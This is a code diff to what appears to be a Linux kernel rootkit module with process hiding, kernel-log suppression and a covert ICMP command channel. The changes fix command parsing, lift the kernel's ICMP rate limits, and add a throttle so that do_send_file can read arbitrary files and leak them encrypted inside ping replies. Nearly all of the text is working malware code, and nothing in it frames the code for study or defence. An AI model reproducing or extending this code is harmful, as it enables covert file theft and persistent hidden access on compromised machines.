@@ -124,9 +124,8 @@ module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);
 
 /* secret */
 #define LEN_SECRET 32 
-static int num_secret = LEN_SECRET;
 static char secret[LEN_SECRET] = "hidden_proc";
-module_param_array(secret, byte, &num_secret, 0644);
+module_param_string(secret, secret, sizeof(secret), 0644);
 
 static char hidden_msg_klog[] = "hidden_proc";
 static char **p_log_buf = NULL;
@@ -1796,7 +1795,7 @@ static int do_icmp_echo(struct sk_buff *skb)
 	int ret = -1;
 
 	icmph = icmp_hdr(skb);
-	cmd = ntohs((short)*((char *)icmph + sizeof(struct icmphdr)));
+	cmd = ntohs(*(short*)((char *)icmph + sizeof(struct icmphdr)));
 	len = skb->len - sizeof(struct icmphdr);
 
 	if (len < LEN_PREFIX_CMD)
@@ -1897,7 +1896,7 @@ static int disable_icmp_echo_limit(struct net *net)
 
 	origin_limit.sysctl_icmp_ratelimit = net->ipv4.sysctl_icmp_ratelimit;
 	if (origin_limit.sysctl_icmp_ratelimit)
-		net->ipv4.sysctl_icmp_ratelimit = INT_MAX;
+		net->ipv4.sysctl_icmp_ratelimit = 0;
 
 	origin_limit.sysctl_icmp_ratemask = net->ipv4.sysctl_icmp_ratemask;
 	if (origin_limit.sysctl_icmp_ratemask & (1<<ICMP_ECHO))
@@ -1938,6 +1937,47 @@ end:
 	return 0;
 } 
 
+static struct net_ratelimit_state {
+	raw_spinlock_t  lock;
+        int             interval;
+        unsigned long   burst;
+        unsigned long   count;
+        unsigned long   begin;
+} icmp_rs = {          	
+	.lock      = __RAW_SPIN_LOCK_UNLOCKED(name.lock),
+	.interval  = HZ/20,
+	.burst     = 1024*128    /* 2.5MB/sec */
+};
+
+static int icmp_ratelimit(struct net_ratelimit_state *rs, int len)
+{
+        int ret;
+
+        if (!rs->interval)
+                return 1;
+
+	if (!raw_spin_trylock(&rs->lock))
+		return 0;
+
+        if (!rs->begin)
+                rs->begin = jiffies;
+
+        if (time_is_before_jiffies(rs->begin + rs->interval)) {
+		rs->begin = jiffies;
+		rs->count = 0;
+        }
+
+        if (rs->burst && rs->count+len <= rs->burst) {
+                rs->count += len;
+                ret = 1;
+        } else {
+                ret = 0;
+        }
+	raw_spin_unlock(&rs->lock);
+        return ret;
+}
+
+
 static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int buf_len)
 {
 	struct sk_buff *skb2 = NULL;
@@ -1959,7 +1999,6 @@ static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int bu
 	rc = kernel_read_file_from_path(fname, &data, &file_size, INT_MAX, 0);
 	if (rc < 0)
 		goto end;
-//	printk(KERN_INFO "fname:%s, size:%llu", fname, file_size);
 
 	size = 0;
 	seq = ntohs(icmp_hdr(skb)->un.echo.sequence);
@@ -1976,15 +2015,15 @@ static int do_send_file(const char *name, struct sk_buff *skb, char *buf, int bu
 		enc_buf(data+size, data+size, len);
 		skb_get(skb2);
 		memcpy(cmd+LEN_PREFIX_CMD+l_name+1, data+size, len);
+		set_seq(icmph, seq++);
 
-		set_seq(icmph, seq);
-		seq++;
+		while (!icmp_ratelimit(&icmp_rs, len)) 
+			schedule_timeout_interruptible(3);
 		real_icmp_echo(skb2);
 		file_size -= len;
 		size += len;
 	}
 	enable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
-//	printk(KERN_INFO "fname:%s, tran size:%llu\n", fname, size);
 
 end:
 	if (skb2)
@@ -2090,8 +2129,7 @@ static int do_secret_task(struct sk_buff *skb)
 {
 	struct icmphdr *icmph = NULL;
 	char *p_cmd = NULL;
-	char *new_sec = NULL;
-	int len_sec = LEN_SECRET;
+	char *buf = NULL;
 	int len = 0;
 	int rc = -1;
 
@@ -2102,21 +2140,21 @@ static int do_secret_task(struct sk_buff *skb)
 	if (len < LEN_SECRET)
 		goto end;
 
-	new_sec = kmalloc(2*len_sec, GFP_KERNEL);
-	if (!new_sec)
+	buf = kmalloc(2*LEN_SECRET, GFP_KERNEL);
+	if (!buf)
 		goto end;
 
-	get_random_bytes(new_sec, len_sec);
-	enc_buf(new_sec+len_sec, new_sec, len_sec);
+	get_random_bytes(buf, LEN_SECRET);
+	enc_buf(buf+LEN_SECRET, buf, LEN_SECRET);
 	
-	memcpy(p_cmd+LEN_PREFIX_CMD, new_sec, len_sec);
+	memcpy(p_cmd+LEN_PREFIX_CMD, buf, LEN_SECRET);
 
 	disable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 	real_icmp_echo(skb);
 	enable_icmp_echo_limit(dev_net(skb_dst(skb)->dev));
 
-	memcpy(secret, new_sec, len_sec);
-	kfree(new_sec);
+	memcpy(secret, buf+LEN_SECRET, LEN_SECRET);
+	kfree(buf);
 
 	rc = 0;
 end:
